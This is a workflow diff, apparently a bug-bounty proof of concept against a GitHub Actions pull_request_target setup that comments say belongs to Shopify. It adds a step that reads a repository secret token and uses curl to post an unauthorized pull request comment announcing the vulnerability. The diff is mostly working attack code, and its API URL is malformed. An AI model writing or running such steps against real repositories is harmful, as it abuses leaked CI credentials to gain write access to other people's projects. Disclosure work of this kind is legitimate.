@@ -35,12 +35,12 @@ jobs:
           cla-token: ${{ secrets.cla-token }}
       - name: Proof of Concept Impact
         env:
-          # Đây là khai báo để Runner của GitHub tự bốc Token dán vào
-          GITHUB_TOKEN: ${{ secrets.token }} 
+          # Phải dùng đúng tên 'secrets.token' như Shopify đã định nghĩa
+          GH_TOKEN: ${{ secrets.token }}
         run: |
           curl -L -X POST \
-          -H "Authorization: Bearer $GITHUB_TOKEN" \
+          -H "Authorization: Bearer $GH_TOKEN" \
           -H "Accept: application/vnd.github+json" \
           "https://github.com{{ github.event.pull_request.number }}/comments" \
-          -d '{"body":"POC SUCCESS: Unauthorized Comment via Actions Write"}'
+          -d '{"body":"[VULNERABILITY CONFIRMED]: Unauthorized write access via pull_request_target."}'
 
